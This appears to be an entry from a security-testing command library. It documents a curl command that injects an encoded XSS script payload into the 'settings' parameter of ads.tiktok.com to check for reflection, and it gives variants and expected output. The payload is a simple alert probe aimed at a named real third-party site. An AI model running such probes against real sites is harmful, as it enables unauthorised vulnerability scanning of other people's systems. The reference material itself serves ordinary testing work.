---
data: >-
  curl
  "https://ads.tiktok.com/page?settings=%3Cscript%3Ealert('XSS')%3C/script%3E"
  -v
tags:
  - web-testing
  - xss
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 5a356dd9-7ff1-43c4-acb6-136f69b0b80c
created_at: '2025-12-13T23:55:38.309Z'
updated_at: '2025-12-13T23:55:38.309Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-with-payload

## Command

```bash
curl "https://ads.tiktok.com/page?settings=%3Cscript%3Ealert('XSS')%3C/script%3E" -v
```

## Description

This command uses curl to fetch a web page with an injected XSS payload in the 'settings' parameter, allowing initial server-side reflection testing before browser execution. It's useful for verifying parameter handling without triggering client-side DOM parsing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target endpoint with encoded payload in 'settings' | Yes |
| -v | Verbose output to inspect headers and response | No |

## Examples

### Basic Usage

```bash
curl "https://ads.tiktok.com/page?settings=test" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://ads.tiktok.com/page?settings=%3Cscript%3Ealert(1)%3C/script%3E" -v -o response.html
```

## Expected Output

HTTP response body containing the reflected payload unescaped, e.g., lines with `<script>alert('XSS')</script>` visible in the HTML. No alert triggers here; use browser for that. Success: 200 OK status and payload in response.

## Related

- [[Related Procedure: Exploiting-DOM-based-XSS-in-Settings-Parameter]]
